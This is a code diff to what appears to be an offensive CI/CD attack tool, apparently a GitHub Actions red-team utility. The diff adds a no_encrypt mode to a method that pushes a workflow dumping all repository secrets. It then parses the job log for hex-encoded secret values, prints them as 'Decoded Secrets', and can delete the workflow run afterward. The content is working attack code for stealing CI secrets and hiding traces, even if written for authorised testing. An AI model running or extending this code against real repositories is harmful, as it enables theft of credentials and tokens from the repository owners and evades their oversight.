@@ -610,7 +610,8 @@ class Attacker:
             target_branch: str,
             commit_message: str,
             delete_action: bool,
-            yaml_name: str):
+            yaml_name: str,
+            no_encrypt: bool = False):
         """Given a user with write access to a repository, runs a workflow that
         dumps all repository secrets.
 
@@ -651,11 +652,16 @@ class Attacker:
                 Output.error(f"Remote branch, {branch}, already exists!")
                 return
 
-            priv_key, pubkey_pem = Attacker.__create_private_key()
-
-            yaml_contents = CICDAttack.create_exfil_yaml(
-                secret_names, pubkey_pem, branch
-            )
+            priv_key = None
+            if no_encrypt:
+                yaml_contents = CICDAttack.create_exfil_yaml_b64(
+                    secret_names, branch
+                )
+            else:
+                priv_key, pubkey_pem = Attacker.__create_private_key()
+                yaml_contents = CICDAttack.create_exfil_yaml(
+                    secret_names, pubkey_pem, branch
+                )
 
             workflow_id = self.__execute_and_wait_workflow(
                 target_repo,
@@ -678,22 +684,64 @@ class Attacker:
                 Output.info("Full job output:")
                 print(res)
 
-                # Parse out the base64 blob with a regex.
-                matcher = re.compile(
-                              r'\$(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}[AEIMQUYcgkosw048]=|[A-Za-z0-9+/][AQgw]==)?\$'
-                          )
+                if no_encrypt:
+                    # Parse GATO_START..GATO_END block and hex decode.
+                    # Only match lines where GATO_START/END is the actual
+                    # output (after timestamp), not echo commands in the
+                    # ##[group] header.
+                    in_block = False
+                    decoded_lines = []
+                    for line in res.splitlines():
+                        # Strip timestamp prefix
+                        content = line
+                        if 'Z ' in content:
+                            content = content.split('Z ', 1)[1]
+                        content = content.strip()
 
-                blob = matcher.findall(res)
+                        if content == 'GATO_START':
+                            in_block = True
+                            continue
+                        if content == 'GATO_END':
+                            in_block = False
+                            continue
+                        if in_block and '=' in content:
+                            parts = content.split('=', 1)
+                            if len(parts) == 2:
+                                name = parts[0]
+                                hex_val = parts[1].strip()
+                                try:
+                                    value = bytes.fromhex(
+                                        hex_val).decode()
+                                    decoded_lines.append(
+                                        f'{name}={value}')
+                                except Exception:
+                                    pass
 
-                if len(blob) == 2:
-                    cleartext = Attacker.__decrypt_secrets(priv_key, blob)
-                    Output.owned("Decrypted and Decoded Secrets:")
-                    print(cleartext.decode())
-
+                    if decoded_lines:
+                        Output.owned("Decoded Secrets:")
+                        for line in decoded_lines:
+                            print(line)
+                    else:
+                        Output.error(
+                            "Unable to extract secrets from runlog!"
+                        )
                 else:
-                    Output.error(
-                        "Unable to extract encoded output from runlog!"
-                    )
+                    # Parse out the base64 blob with a regex.
+                    matcher = re.compile(
+                                  r'\$(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}[AEIMQUYcgkosw048]=|[A-Za-z0-9+/][AQgw]==)?\$'
+                              )
+
+                    blob = matcher.findall(res)
+
+                    if len(blob) == 2:
+                        cleartext = Attacker.__decrypt_secrets(
+                            priv_key, blob)
+                        Output.owned("Decrypted and Decoded Secrets:")
+                        print(cleartext.decode())
+                    else:
+                        Output.error(
+                            "Unable to extract encoded output from runlog!"
+                        )
 
             if delete_action:
                 res = self.api.delete_workflow_run(target_repo, workflow_id)
